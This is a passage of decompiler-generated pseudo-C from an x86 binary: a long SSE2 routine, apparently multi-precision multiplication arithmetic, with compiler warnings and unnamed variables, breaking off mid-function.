// 44AF2C: variable 'v127' is possibly undefined
// 44AFC7: variable 'v143' is possibly undefined
// 44B017: variable 'v151' is possibly undefined
// 44B077: variable 'v163' is possibly undefined
// 44B0C4: variable 'v171' is possibly undefined
// 44B15F: variable 'v187' is possibly undefined
// 44B1AF: variable 'v195' is possibly undefined
// 44B20F: variable 'v207' is possibly undefined
// 44B25C: variable 'v215' is possibly undefined
// 44B2F7: variable 'v231' is possibly undefined
// 44B347: variable 'v239' is possibly undefined
// 44B3A7: variable 'v252' is possibly undefined
// 44B3F4: variable 'v260' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (0044AA29) --------------------------------------------------------
int sub_44AA29()
{
  return sub_44AA66();
}
// 44AA66: using guessed type int sub_44AA66(void);

//----- (0044AA66) --------------------------------------------------------
int sub_44AA66()
{
  return sub_44AAA3();
}
// 44AAA3: using guessed type int sub_44AAA3(void);

//----- (0044AAA3) --------------------------------------------------------
__m128i __usercall sub_44AAA3@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 32)), _mm_load_si128(a2 + 2)), 0x10u);
}

//----- (0044B600) --------------------------------------------------------
int __cdecl sub_44B600(int a1, int a2)
{
  unsigned int i; // edx
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  __m128i v5; // xmm7
  __m128i v6; // xmm5
  __m128i si128; // xmm6
  __m128i v8; // xmm4
  __m128i v9; // xmm7
  __m128i v10; // xmm6
  __m128i v11; // xmm7
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128 v14; // xmm6
  __m128 v15; // xmm4
  __m128i v16; // xmm6
  __m128 v17; // xmm5
  __m128i v18; // xmm4
  __m128i v19; // xmm7
  __m128i v20; // xmm5
  __m128i v21; // xmm6
  __m128i v22; // xmm4
  __m128i v23; // xmm5
  __m128i v24; // xmm7
  __m128i v25; // xmm6
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm5
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128 v32; // xmm6
  __m128 v33; // xmm4
  __m128i v34; // xmm6
  __m128 v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm5
  __m128i v39; // xmm6
  __m128i v40; // xmm4
  __m128i v41; // xmm5
  __m128i v42; // xmm7
  __m128i v43; // xmm3
  __m128i v44; // xmm1
  __m128i v45; // xmm3
  __m128i v46; // xmm2
  __m128i v47; // xmm6
  __m128i v48; // xmm7
  __m128i v49; // xmm6
  __m128i v50; // xmm7
  __m128i v51; // xmm5
  __m128i v52; // xmm0
  __m128i v53; // xmm1
  __m128 v54; // xmm6
  __m128 v55; // xmm4
  __m128i v56; // xmm6
  __m128 v57; // xmm5
  __m128i v58; // xmm4
  __m128i v59; // xmm7
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm4
  __m128i v63; // xmm5
  __m128i v64; // xmm7
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm6
  __m128i v68; // xmm7
  __m128i v69; // xmm5
  __m128i v70; // xmm0
  __m128i v71; // xmm1
  __m128 v72; // xmm6
  __m128 v73; // xmm4
  __m128i v74; // xmm6
  int v75; // ecx
  __m128 v76; // xmm5
  __m128i v77; // xmm4
  __m128i v78; // xmm7
  __m128i v79; // xmm5
  __m128i v80; // xmm6
  __m128i v81; // xmm4
  __m128i v82; // xmm5
  int v83; // edx
  __m128i v84; // xmm7
  __m128i v85; // xmm3
  __m128i v86; // xmm1
  __m128i v87; // xmm3
  __m128i v88; // xmm2
  __m128i v89; // xmm6
  __m128i v90; // xmm7
  __m128i v91; // xmm6
  __m128i v92; // xmm7
  __m128i v93; // xmm5
  __m128i v94; // xmm0
  __m128i v95; // xmm1
  __m128 v96; // xmm6
  __m128 v97; // xmm4
  __m128i v98; // xmm6
  int v99; // ecx
  __m128 v100; // xmm5
  __m128i v101; // xmm4
  __m128i v102; // xmm7
  __m128i v103; // xmm5
  __m128i v104; // xmm6
  __m128i v105; // xmm4
  __m128i v106; // xmm5
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm7
  __m128i v111; // xmm6
  __m128i v112; // xmm7
  __m128i v113; // xmm5
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128 v116; // xmm6
  __m128 v117; // xmm4
  __m128i v118; // xmm6
  int v119; // ecx
  __m128 v120; // xmm5
  __m128i v121; // xmm4
  __m128i v122; // xmm7
  __m128i v123; // xmm5
  __m128i v124; // xmm6
  __m128i v125; // xmm4
  __m128i v126; // xmm5
  int v127; // edx
  __m128i v128; // xmm7
  __m128i v129; // xmm3
  __m128i v130; // xmm1
  __m128i v131; // xmm3
  __m128i v132; // xmm2
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm6
  __m128i v136; // xmm7
  __m128i v137; // xmm5
  __m128i v138; // xmm0
  __m128i v139; // xmm1
  __m128 v140; // xmm6
  __m128 v141; // xmm4
  __m128i v142; // xmm6
  int v143; // ecx
  __m128 v144; // xmm5
  __m128i v145; // xmm4
  __m128i v146; // xmm7
  __m128i v147; // xmm5
  __m128i v148; // xmm6
  __m128i v149; // xmm4
  __m128i v150; // xmm5
  __m128i *v151; // edx
  __m128i v152; // xmm7
  __m128i v153; // xmm6
  __m128i v154; // xmm7
  __m128i v155; // xmm6
  __m128i v156; // xmm7
  __m128i v157; // xmm5
  __m128i v158; // xmm0
  __m128i v159; // xmm1
  __m128 v160; // xmm6
  __m128 v161; // xmm4
  __m128i v162; // xmm6
  int v163; // ecx
  __m128 v164; // xmm5
  __m128i v165; // xmm4
  __m128i v166; // xmm7
  __m128i v167; // xmm5
  __m128i v168; // xmm6
  __m128i v169; // xmm4
  __m128i v170; // xmm5
  int v171; // edx
  __m128i v172; // xmm7
  __m128i v173; // xmm3
  __m128i v174; // xmm1
  __m128i v175; // xmm3
  __m128i v176; // xmm2
  __m128i v177; // xmm6
  __m128i v178; // xmm7
  __m128i v179; // xmm6
  __m128i v180; // xmm7
  __m128i v181; // xmm5
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128 v184; // xmm6
  __m128 v185; // xmm4
  __m128i v186; // xmm6
  int v187; // ecx
  __m128 v188; // xmm5
  __m128i v189; // xmm4
  __m128i v190; // xmm7
  __m128i v191; // xmm5
  __m128i v192; // xmm6
  __m128i v193; // xmm4
  __m128i v194; // xmm5
  __m128i *v195; // edx
  __m128i v196; // xmm7
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm6
  __m128i v200; // xmm7
  __m128i v201; // xmm5
  __m128i v202; // xmm0
  __m128i v203; // xmm1
  __m128 v204; // xmm6
  __m128 v205; // xmm4
  __m128i v206; // xmm6
  int v207; // ecx
  __m128 v208; // xmm5
  __m128i v209; // xmm4
  __m128i v210; // xmm7
  __m128i v211; // xmm5
  __m128i v212; // xmm6
  __m128i v213; // xmm4
  __m128i v214; // xmm5
  int v215; // edx
  __m128i v216; // xmm7
  __m128i v217; // xmm3
  __m128i v218; // xmm1
  __m128i v219; // xmm3
  __m128i v220; // xmm2
  __m128i v221; // xmm6
  __m128i v222; // xmm7
  __m128i v223; // xmm6
  __m128i v224; // xmm7
  __m128i v225; // xmm5
  __m128i v226; // xmm0
  __m128i v227; // xmm1
  __m128 v228; // xmm6
  __m128 v229; // xmm4
  __m128i v230; // xmm6
  int v231; // ecx
  __m128 v232; // xmm5
  __m128i v233; // xmm4
  __m128i v234; // xmm7
  __m128i v235; // xmm5
  __m128i v236; // xmm6
  __m128i v237; // xmm4
  __m128i v238; // xmm5
  __m128i *v239; // edx
  __m128i v240; // xmm7
  __m128i v241; // xmm6
  __m128i v242; // xmm7
  __m128i v243; // xmm6
  __m128i v244; // xmm7
  __m128i v245; // xmm5
  __m128i v246; // xmm0
  __m128i v247; // xmm1
  __m128 v248; // xmm6
  __m128 v249; // xmm4
  __m128i v250; // xmm6
  int v251; // ecx
  __m128 v252; // xmm5
  __m128i v253; // xmm4
  __m128i v254; // xmm7
  __m128i v255; // xmm5
  __m128i v256; // xmm6
  __m128i v257; // xmm4
  __m128i v258; // xmm5
  int v259; // edx
  __m128i v260; // xmm7
  __m128i v261; // xmm3
  __m128i v262; // xmm1
  __m128i v263; // xmm3
  __m128i v264; // xmm2
  __m128i v265; // xmm6
  __m128i v266; // xmm7
  __m128i v267; // xmm6
  __m128i v268; // xmm7
  __m128i v269; // xmm5
  __m128i v270; // xmm0
  __m128i v271; // xmm1
  __m128 v272; // xmm6
  __m128 v273; // xmm4
  __m128i v274; // xmm6
  int v275; // ecx
  __m128 v276; // xmm5
  __m128i v277; // xmm4
  __m128i v278; // xmm7
  __m128i v279; // xmm5
  __m128i v280; // xmm6
  __m128i v281; // xmm4
  __m128i v282; // xmm5
  __m128i *v283; // edx
  __m128i v284; // xmm7
  __m128i v285; // xmm6
  __m128i v286; // xmm7
  __m128i v287; // xmm6
  __m128i v288; // xmm7
  __m128i v289; // xmm5
  __m128i v290; // xmm0
  __m128i v291; // xmm1
  __m128 v292; // xmm6
  __m128 v293; // xmm4
  __m128i v294; // xmm6
  int v295; // ecx
  __m128 v296; // xmm5
  __m128i v297; // xmm4
  __m128i v298; // xmm7
  __m128i v299; // xmm5
  __m128i v300; // xmm6
  __m128i v301; // xmm4
  __m128i v302; // xmm5
  int v303; // edx
  __m128i v304; // xmm7
  __m128i v305; // xmm3
  __m128i v306; // xmm1
  __m128i v307; // xmm3
  __m128i v308; // xmm2
  __m128i v309; // xmm6
  __m128i v310; // xmm7
  __m128i v311; // xmm6
  __m128i v312; // xmm7
  __m128i v313; // xmm5
  __m128i v314; // xmm0
  __m128i v315; // xmm1
  __m128 v316; // xmm6
  __m128 v317; // xmm4
  __m128i v318; // xmm6
  int v319; // ecx
  __m128 v320; // xmm5
  __m128i v321; // xmm4
  __m128i v322; // xmm7
  __m128i v323; // xmm5
  __m128i v324; // xmm6
  __m128i v325; // xmm4
  __m128i v326; // xmm5
  __m128i *v327; // edx
  __m128i v328; // xmm7
  __m128i v329; // xmm6
  __m128i v330; // xmm7
  __m128i v331; // xmm6
  __m128i v332; // xmm7
  __m128i v333; // xmm5
  __m128i v334; // xmm0
  __m128i v335; // xmm1
  __m128 v336; // xmm6
  __m128 v337; // xmm4
  __m128i v338; // xmm6
  int v339; // ecx
  __m128 v340; // xmm5
  __m128i v341; // xmm4
  __m128i v342; // xmm7
  __m128i v343; // xmm5
  __m128i v344; // xmm6
  __m128i v345; // xmm4
  __m128i v346; // xmm5
  int v347; // edx
  __m128i v348; // xmm7
  __m128i v349; // xmm3
  __m128i v350; // xmm1
  __m128i v351; // xmm3
  __m128i v352; // xmm2
  __m128i v353; // xmm6
  __m128i v354; // xmm7
  __m128i v355; // xmm6
  __m128i v356; // xmm7
  __m128i v357; // xmm5
  __m128i v358; // xmm0
  __m128i v359; // xmm1
  __m128 v360; // xmm6
  __m128 v361; // xmm4
  __m128i v362; // xmm6
  int v363; // ecx
  __m128 v364; // xmm5
  __m128i v365; // xmm4
  __m128i v366; // xmm7
  __m128i v367; // xmm5
  __m128i v368; // xmm6
  __m128i v369; // xmm4
  __m128i v370; // xmm5
  __m128i *v371; // edx
  __m128i v372; // xmm7
  __m128i v373; // xmm6
  __m128i v374; // xmm7
  __m128i v375; // xmm6
  __m128i v376; // xmm7
  __m128i v377; // xmm5
  __m128i v378; // xmm0
  __m128i v379; // xmm1
  __m128 v380; // xmm6
  __m128 v381; // xmm4
  __m128i v382; // xmm6
  int v383; // ecx
  __m128 v384; // xmm5
  __m128i v385; // xmm4
  __m128i v386; // xmm7
  __m128i v387; // xmm5
  __m128i v388; // xmm6
  __m128i v389; // xmm4
  __m128i v390; // xmm5
  int v391; // edx
  __m128i v392; // xmm7
  __m128i v393; // xmm3
  __m128i v394; // xmm1
  __m128i v395; // xmm3
  __m128i v396; // xmm2
  __m128i v397; // xmm6
  __m128i v398; // xmm7
  __m128i v399; // xmm6
  __m128i v400; // xmm7
  __m128i v401; // xmm5
  __m128i v402; // xmm0
  __m128i v403; // xmm1
  __m128 v404; // xmm6
  __m128 v405; // xmm4
  __m128i v406; // xmm6
  int v407; // ecx
  __m128 v408; // xmm5
  __m128i v409; // xmm4
  __m128i v410; // xmm7
  __m128i v411; // xmm5
  __m128i v412; // xmm6
  __m128i v413; // xmm4
  __m128i v414; // xmm5
  __m128i *v415; // edx
  __m128i v416; // xmm7
  __m128i v417; // xmm6
  __m128i v418; // xmm7
  __m128i v419; // xmm6
  __m128i v420; // xmm7
  __m128i v421; // xmm5
  __m128i v422; // xmm0
  __m128i v423; // xmm1
  __m128 v424; // xmm6
  __m128 v425; // xmm4
  __m128i v426; // xmm6
  int v427; // ecx
  __m128 v428; // xmm5
  __m128i v429; // xmm4
  __m128i v430; // xmm7
  __m128i v431; // xmm5
  __m128i v432; // xmm6
  __m128i v433; // xmm4
  __m128i v434; // xmm5
  int v435; // edx
  __m128i v436; // xmm7
  __m128i v437; // xmm3
  __m128i v438; // xmm1
  __m128i v439; // xmm3
  __m128i v440; // xmm2
  __m128i v441; // xmm6
  __m128i v442; // xmm7
  __m128i v443; // xmm6
  __m128i v444; // xmm7
  __m128i v445; // xmm5
  __m128i v446; // xmm0
  __m128i v447; // xmm1
  __m128 v448; // xmm6
  __m128 v449; // xmm4
  __m128i v450; // xmm6
  int v451; // ecx
  __m128 v452; // xmm5
  __m128i v453; // xmm4
  __m128i v454; // xmm7
  __m128i v455; // xmm5
  __m128i v456; // xmm6
  __m128i v457; // xmm4
  __m128i v458; // xmm5
  __m128i *v459; // edx
  __m128i v460; // xmm7
  __m128i v461; // xmm6
  __m128i v462; // xmm7
  __m128i v463; // xmm6
  __m128i v464; // xmm7
  __m128i v465; // xmm5
  __m128i v466; // xmm0
  __m128i v467; // xmm1
  __m128 v468; // xmm6
  __m128 v469; // xmm4
  __m128i v470; // xmm6
  int v471; // ecx
  __m128 v472; // xmm5
  __m128i v473; // xmm4
  __m128i v474; // xmm7
  __m128i v475; // xmm5
  __m128i v476; // xmm6
  __m128i v477; // xmm4
  __m128i v478; // xmm5
  int v479; // edx
  __m128i v480; // xmm7
  __m128i v481; // xmm3
  __m128i v482; // xmm1
  __m128i v483; // xmm3
  __m128i v484; // xmm2
  __m128i v485; // xmm6
  __m128i v486; // xmm7
  __m128i v487; // xmm6
  __m128i v488; // xmm7
  __m128i v489; // xmm5
  __m128i v490; // xmm0
  __m128i v491; // xmm1
  __m128 v492; // xmm6
  __m128 v493; // xmm4
  __m128i v494; // xmm6
  int v495; // ecx
  __m128 v496; // xmm5
  __m128i v497; // xmm4
  __m128i v498; // xmm7
  __m128i v499; // xmm5
  __m128i v500; // xmm6
  __m128i v501; // xmm4
  __m128i v502; // xmm5
  __m128i *v503; // edx
  __m128i v504; // xmm7
  __m128i v505; // xmm6
  __m128i v506; // xmm7
  __m128i v507; // xmm6
  __m128i v508; // xmm7
  __m128i v509; // xmm5
  __m128i v510; // xmm0
  __m128i v511; // xmm1
  __m128 v512; // xmm6
  __m128 v513; // xmm4
  __m128i v514; // xmm6
  int v515; // ecx
  __m128 v516; // xmm5
  __m128i v517; // xmm4
  __m128i v518; // xmm7
  __m128i v519; // xmm5
  __m128i v520; // xmm6
  __m128i v521; // xmm4
  __m128i v522; // xmm5
  int v523; // edx
  __m128i v524; // xmm7
  __m128i v525; // xmm3
  __m128i v526; // xmm1
  __m128i v527; // xmm3
  __m128i v528; // xmm2
  __m128i v529; // xmm6
  __m128i v530; // xmm7
  __m128i v531; // xmm6
  __m128i v532; // xmm7
  __m128i v533; // xmm5
  __m128i v534; // xmm0
  __m128i v535; // xmm1
  __m128 v536; // xmm6
  __m128 v537; // xmm4
  __m128i v538; // xmm6
  int v539; // ecx
  __m128 v540; // xmm5
  __m128i v541; // xmm4
  __m128i v542; // xmm7
  __m128i v543; // xmm5
  __m128i v544; // xmm6
  __m128i v545; // xmm4
  __m128i v546; // xmm5
  __m128i *v547; // edx
  __m128i v548; // xmm7
  __m128i v549; // xmm6
  __m128i v550; // xmm7
  __m128i v551; // xmm6
  __m128i v552; // xmm7
  __m128i v553; // xmm5
  __m128i v554; // xmm0
  __m128i v555; // xmm1
  __m128 v556; // xmm6
  __m128 v557; // xmm4
  __m128i v558; // xmm6
  int v559; // ecx
  __m128 v560; // xmm5
  __m128i v561; // xmm4
  __m128i v562; // xmm7
  __m128i v563; // xmm5
  __m128i v564; // xmm6
  __m128i v565; // xmm4
  __m128i v566; // xmm5
  int v567; // edx
  __m128i v568; // xmm7
  __m128i v569; // xmm3
  __m128i v570; // xmm1
  __m128i v571; // xmm3
  __m128i v572; // xmm2
  __m128i v573; // xmm6
  __m128i v574; // xmm7
  __m128i v575; // xmm6
  __m128i v576; // xmm7
  __m128i v577; // xmm5
  __m128i v578; // xmm0
  __m128i v579; // xmm1
  __m128 v580; // xmm6
  __m128 v581; // xmm4
  __m128i v582; // xmm6
  int v583; // ecx
  __m128 v584; // xmm5
  __m128i v585; // xmm4
  __m128i v586; // xmm7
  __m128i v587; // xmm5
  __m128i v588; // xmm6
  __m128i v589; // xmm4
  __m128i v590; // xmm5
  __m128i *v591; // edx
  __m128i v592; // xmm7
  __m128i v593; // xmm6
  __m128i v594; // xmm7
  int result; // eax
  __m128i v596; // xmm6
  __m128i v597; // xmm7
  __m128i v598; // xmm5
  __m128i v599; // xmm0
  __m128i v600; // xmm1
  __m128 v601; // xmm6
  __m128 v602; // xmm4
  __m128i v603; // xmm6
  int v604; // ecx
  __m128 v605; // xmm5
  __m128i v606; // xmm4
  __m128i v607; // xmm7
  __m128i v608; // xmm5
  __m128i v609; // xmm6
  __m128i v610; // xmm4
  __m128i v611; // xmm5
  __m128i *v612; // edx
  __m128i v613; // xmm7
  __m128i v614; // xmm3
  __m128i v615; // xmm1
  __m128i v616; // xmm3
  __m128i v617; // xmm2
  __m128i v618; // xmm6
  __m128i v619; // xmm7
  __m128i v620; // xmm6
  __m128i v621; // xmm7
  __m128i v622; // xmm5
  __m128i v623; // xmm0
  __m128i v624; // xmm1
  __m128 v625; // xmm6
  __m128 v626; // xmm4
  __m128i v627; // xmm6
  __m128 v628; // xmm5
  __m128i v629; // xmm4
  __m128i v630; // xmm7
  __m128i v631; // xmm5
  __m128i v632; // xmm6
  __m128i v633; // xmm4
  __m128i v634; // xmm5
  __m128i v635; // xmm7
  __m128i v636; // xmm6
  __m128i v637; // xmm7
  __m128i v638; // xmm6
  __m128i v639; // xmm7
  __m128i v640; // xmm0
  __m128i v641; // xmm1
  __m128i v642; // xmm4
  __m128i v643; // xmm5
  __m128i v644; // xmm6
  __m128i v645; // xmm5
  __m128i v646; // xmm4
  __m128i v647; // xmm7
  __m128i v648; // xmm0
  __m128i v649; // xmm7
  __m128i v650; // xmm6
  __m128i v651; // xmm2
  __m128i v652; // xmm5
  __m128i v653; // xmm6
  __m128i v654; // xmm7
  __m128i v655; // xmm0
  __m128i v656; // xmm1
  __m128i v657; // xmm4
  __m128i v658; // xmm5
  __m128i v659; // xmm6
  __m128i v660; // [esp+0h] [ebp-21Ch] BYREF
  __m128i v661; // [esp+10h] [ebp-20Ch] BYREF
  __m128i v662; // [esp+20h] [ebp-1FCh] BYREF
  __m128i v663; // [esp+30h] [ebp-1ECh] BYREF
  __m128i v664; // [esp+40h] [ebp-1DCh] BYREF
  __m128i v665; // [esp+50h] [ebp-1CCh] BYREF
  __m128i v666; // [esp+60h] [ebp-1BCh] BYREF
  __m128i v667; // [esp+70h] [ebp-1ACh] BYREF
  __m128i v668; // [esp+80h] [ebp-19Ch] BYREF
  __m128i v669; // [esp+90h] [ebp-18Ch] BYREF
  __m128i v670; // [esp+A0h] [ebp-17Ch] BYREF
  __m128i v671; // [esp+B0h] [ebp-16Ch] BYREF
  __m128i v672; // [esp+C0h] [ebp-15Ch] BYREF
  __m128i v673; // [esp+D0h] [ebp-14Ch] BYREF
  __m128i v674; // [esp+E0h] [ebp-13Ch] BYREF
  __m128i v675; // [esp+F0h] [ebp-12Ch] BYREF
  __m128i v676; // [esp+100h] [ebp-11Ch] BYREF
  __m128i v677; // [esp+110h] [ebp-10Ch]
  __m128i v678[15]; // [esp+120h] [ebp-FCh]

  for ( i = 0; i != 128; i += 16 )
  {
    v3 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v661 + 2 * i) = v3;
    *(__m128i *)((char *)&v661 + 2 * i + 16) = _mm_srli_epi64(v3, 0x20u);
    *(__m128i *)((char *)&v677 + 2 * i) = v4;
    v678[i / 8] = _mm_srli_epi64(v4, 0x20u);
  }
  v5 = _mm_load_si128(&v661);
  v6 = _mm_mul_epu32(v5, v5);
  si128 = _mm_load_si128(&stru_4BACE0);
  v8 = _mm_and_si128(si128, v6);
  v9 = _mm_mul_epu32(v5, v677);
  v10 = _mm_and_si128(si128, v9);
  v11 = _mm_srli_epi32(v9, 0x10u);
  v12 = _mm_move_epi64(v10);
  v13 = _mm_move_epi64(v11);
  v14 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v10, v12), v12), 4);
  v15 = (__m128)_mm_add_epi32(v8, (__m128i)v14);
  v16 = (__m128i)_mm_movehl_ps(v14, v15);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v15);
  v17 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v6, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v17);
  v18 = _mm_add_epi64(_mm_srli_epi64((__m128i)v15, 0x10u), (__m128i)v17);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v18, 0x30u), v16).m128i_u64[0];
  v19 = _mm_load_si128(&v662);
  v20 = _mm_mul_epu32(_mm_load_si128(&v661), v19);
  v21 = _mm_load_si128(&stru_4BACE0);
  v22 = _mm_and_si128(v21, v20);
  v23 = _mm_srli_epi32(v20, 0x10u);
  v24 = _mm_mul_epu32(v19, v677);
  v25 = _mm_and_si128(v21, v24);
  v26 = _mm_srli_epi32(v24, 0x10u);
  v27 = _mm_add_epi32(v25, v25);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v30 = _mm_move_epi64(v27);
  v31 = _mm_move_epi64(v28);
  v32 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v30), v30), 4);
  v33 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v22, v22), _mm_loadl_epi64(&v660)), (__m128i)v32);
  v34 = (__m128i)_mm_movehl_ps(v32, v33);
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32((__m128i)v33);
  v35 = (__m128)_mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v31), v31), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v35);
  v36 = _mm_add_epi64(_mm_srli_epi64((__m128i)v33, 0x10u), (__m128i)v35);
  *(_QWORD *)(a1 + 10) = v36.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v36, 0x30u), v34).m128i_u64[0];
  v37 = _mm_load_si128(&v663);
  v38 = _mm_mul_epu32(_mm_load_si128(&v661), v37);
  v39 = _mm_load_si128(&stru_4BACE0);
  v40 = _mm_and_si128(v39, v38);
  v41 = _mm_srli_epi32(v38, 0x10u);
  v42 = _mm_mul_epu32(v37, v677);
  v43 = _mm_load_si128(&v662);
  v44 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v662.m128i_i8[8]), v43);
  v45 = _mm_mul_epu32(v43, v43);
  v46 = v39;
  v47 = _mm_add_epi32(_mm_and_si128(v39, v42), _mm_and_si128(v39, v44));
  v48 = _mm_add_epi32(_mm_srli_epi32(v42, 0x10u), _mm_srli_epi32(v44, 0x10u));
  v49 = _mm_add_epi32(v47, v47);
  v50 = _mm_add_epi32(v48, v48);
  v51 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v41, v41), _mm_srli_epi32(v45, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v52 = _mm_move_epi64(v49);
  v53 = _mm_move_epi64(v50);
  v54 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v52), v52), 4);
  v55 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v40, v40), _mm_and_si128(v46, v45)), _mm_loadl_epi64(&v660)),
                  (__m128i)v54);
  v56 = (__m128i)_mm_movehl_ps(v54, v55);
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32((__m128i)v55);
  v57 = (__m128)_mm_add_epi32(v51, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v50, v53), v53), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v57);
  v58 = _mm_add_epi64(_mm_srli_epi64((__m128i)v55, 0x10u), (__m128i)v57);
  *(_QWORD *)(a1 + 18) = v58.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v58, 0x30u), v56).m128i_u64[0];
  v59 = _mm_load_si128(&v663);
  v60 = _mm_mul_epu32(_mm_load_si128(&v662), v59);
  v61 = _mm_load_si128(&stru_4BACE0);
  v62 = _mm_and_si128(v61, v60);
  v63 = _mm_srli_epi32(v60, 0x10u);
  v64 = _mm_mul_epu32(v59, v678[0]);
  v65 = _mm_and_si128(v61, v64);
  v66 = _mm_srli_epi32(v64, 0x10u);
  sub_44B80D((int)&v663, &v662);
  v67 = _mm_add_epi32(v65, v65);
  v68 = _mm_add_epi32(v66, v66);
  v69 = _mm_add_epi32(_mm_add_epi32(v63, v63), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v70 = _mm_move_epi64(v67);
  v71 = _mm_move_epi64(v68);
  v72 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v67, v70), v70), 4);
  v73 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v62, v62), _mm_loadl_epi64(&v660)), (__m128i)v72);
  v74 = (__m128i)_mm_movehl_ps(v72, v73);
  *(_DWORD *)(v75 + 24) = _mm_cvtsi128_si32((__m128i)v73);
  v76 = (__m128)_mm_add_epi32(v69, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v68, v71), v71), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v76);
  v77 = _mm_add_epi64(_mm_srli_epi64((__m128i)v73, 0x10u), (__m128i)v76);
  *(_QWORD *)(v75 + 26) = v77.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v77, 0x30u), v74).m128i_u64[0];
  v78 = _mm_load_si128(&v664);
  v79 = _mm_mul_epu32(_mm_load_si128(&v662), v78);
  v80 = _mm_load_si128(&stru_4BACE0);
  v81 = _mm_and_si128(v80, v79);
  v82 = _mm_srli_epi32(v79, 0x10u);
  v84 = _mm_mul_epu32(v78, *(__m128i *)(v83 - 16));
  sub_44B80D((int)&v663, &v663);
  v85 = _mm_load_si128(&v663);
  v86 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v663.m128i_i8[8]), v85);
  v87 = _mm_mul_epu32(v85, v85);
  v88 = _mm_load_si128(&stru_4BACE0);
  v89 = _mm_add_epi32(_mm_and_si128(v80, v84), _mm_and_si128(v88, v86));
  v90 = _mm_add_epi32(_mm_srli_epi32(v84, 0x10u), _mm_srli_epi32(v86, 0x10u));
  v91 = _mm_add_epi32(v89, v89);
  v92 = _mm_add_epi32(v90, v90);
  v93 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v82, v82), _mm_srli_epi32(v87, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v94 = _mm_move_epi64(v91);
  v95 = _mm_move_epi64(v92);
  v96 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v91, v94), v94), 4);
  v97 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v81, v81), _mm_and_si128(v88, v87)), _mm_loadl_epi64(&v660)),
                  (__m128i)v96);
  v98 = (__m128i)_mm_movehl_ps(v96, v97);
  *(_DWORD *)(v99 + 32) = _mm_cvtsi128_si32((__m128i)v97);
  v100 = (__m128)_mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v92, v95), v95), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v100);
  v101 = _mm_add_epi64(_mm_srli_epi64((__m128i)v97, 0x10u), (__m128i)v100);
  *(_QWORD *)(v99 + 34) = v101.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v101, 0x30u), v98).m128i_u64[0];
  v102 = _mm_load_si128(&v664);
  v103 = _mm_mul_epu32(_mm_load_si128(&v663), v102);
  v104 = _mm_load_si128(&stru_4BACE0);
  v105 = _mm_and_si128(v104, v103);
  v106 = _mm_srli_epi32(v103, 0x10u);
  v108 = _mm_mul_epu32(v102, *v107);
  v109 = _mm_and_si128(v104, v108);
  v110 = _mm_srli_epi32(v108, 0x10u);
  sub_44B7D0();
